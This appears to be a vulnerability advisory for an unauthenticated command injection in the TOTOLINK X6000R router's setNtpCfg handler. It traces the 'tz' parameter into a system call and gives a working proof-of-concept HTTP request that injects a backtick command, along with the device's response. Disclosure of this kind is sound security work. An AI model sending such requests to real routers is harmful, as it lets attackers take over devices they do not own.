# setNtpCfg

**Overview**

- Vendor: TOTOLINK
- Product: Totolink X6000R
- Version: V9.4.0cu.1360_B20241207
- Manufacturer's address：[https://www.totolink.net/](https://www.totolink.net/)
- Firmware download address : [https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar](https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar)
- **Author:** dtro and datnlq from VietSunshine Cyber Security Services

**Vulnerability details**

Totolink X6000R V9.4.0cu.1360_B20241207 was found to contain a command injection vulnerability in the `sub_4184C0` function via the `tz` parameter. This vulnerability allows unauthenticated attackers to execute arbitrary commands via a crafted request.

**Analyse**

- In the binary file `shttp`, the function `sub_4184C0` retrieves the `tz` parameter, passes it to register X25 , and then calls `Uci_Set_Str`

![image.png](setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image.png)

- Call the function `uci_set_str` to set the values for timezone and NTP using register X25, then the function `set_timezone_to_kernel` is called

![image.png](setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%201.png)

- In the binary file `libcscommon.so` , the function `set_timezone_to_kernel`, it calls the function `uci_get_str` to retrieve the previously set values for timezone and NTP, then passes them to the function `do_system`.

![image.png](setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%202.png)

**Request**

```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.210.133:8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 128

{"tz":"UTC+9`ls>/web/cmd1.txt`","enable":"1","server":"pool.ntp.org*cn.pool.ntp.org*europe.pool.ntp.org","topicurl":"setNtpCfg"}
```

**Response**

```python
HTTP/1.0 200 OK
Server: SHTTPD 
Date: Tue, 10 Jun 2025 07:26:12 GMT
X-UA-Compatible: IE=edge
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: -1
Content-Type: application/json
Connection: close

{ "success": true, "error": "", "lan_ip": "", "wtime": "", "reserv": "reserv" }
```

**PoC**

![image.png](setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%203.png)

![image.png](setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%204.png)

**Reference:** 

- [https://github.com/phieulang1993/emu/tree/master/emu_arm](https://github.com/phieulang1993/emu/tree/master/emu_arm)